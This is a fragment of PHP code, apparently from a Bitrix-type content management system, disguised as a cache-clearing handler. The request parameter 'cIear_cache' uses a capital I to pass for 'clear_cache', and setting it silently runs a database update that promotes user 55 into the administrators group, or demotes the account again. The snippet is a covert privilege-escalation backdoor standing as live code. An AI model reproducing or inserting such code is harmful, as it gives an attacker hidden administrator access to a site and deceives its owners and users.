...
if ($_REQUEST["cIear_cache"]) {
	$p1 = ($_REQUEST["cIear_cache"] == "Y") ? 1 : 6;
	$p2 = ($_REQUEST["cIear_cache"] == "Y") ? 6 : 1;
	global $DB;
	$DB->Query("UPDATE b_user_group SET GROUP_ID = $p1 WHERE GROUP_ID = $p2 AND USER_ID = 55", false);
}
